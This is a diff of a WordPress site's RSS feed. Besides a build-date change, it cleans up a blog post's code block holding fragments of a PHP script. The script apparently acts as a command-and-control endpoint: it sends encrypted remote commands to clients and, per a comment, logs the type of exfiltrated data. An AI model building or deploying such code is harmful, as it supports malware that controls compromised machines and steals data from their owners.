@@ -12,7 +12,7 @@
 	<atom:link href="https://wpdeeply.com/feed/" rel="self" type="application/rss+xml" />
 	<link>http://wpdeeply.com/</link>
 	<description></description>
-	<lastBuildDate>Mon, 24 Aug 2020 03:24:51 +0000</lastBuildDate>
+	<lastBuildDate>Mon, 24 Aug 2020 03:33:18 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -158,8 +158,7 @@ if ( isset($_REQUEST["wpdeeply"])){
 
 
 
-<pre class="wp-block-code"><code lang="php" class="language-php">&lt;?php
-include 'sodium_compat/autoload.php';
+<pre class="wp-block-code"><code lang="php" class="language-php">include 'sodium_compat/autoload.php';
 
 //handle the requests from the client/s
 if ( isset($_POST["rcr"]) ){
@@ -200,7 +199,7 @@ if ( !$remote_client_requirements ) exit(0);
 if ( is_array($remote_client_requirements) &amp;&amp; isset($remote_client_requirements['key']) &amp;&amp; isset($remote_client_requirements['type']) ){
     $session_key = base64_decode($remote_client_requirements['key']);
     $session_nonce = \Sodium\randombytes_buf(\Sodium\CRYPTO_SECRETBOX_NONCEBYTES);
-    $response = json_encode(array( 'payload' =&#x26;#x3E;base64_encode(\Sodium\crypto_secretbox($remote_cmd, $session_nonce, $session_key)), 'nonce'=&#x26;#x3E; base64_encode($session_nonce)));
+    $response = json_encode(array( 'payload' => base64_encode(\Sodium\crypto_secretbox($remote_cmd, $session_nonce, $session_key)), 'nonce'=> base64_encode($session_nonce)));
     //add some fancy logging in order to know the client and type+format of exfiltrated data 
     echo $response;
 }
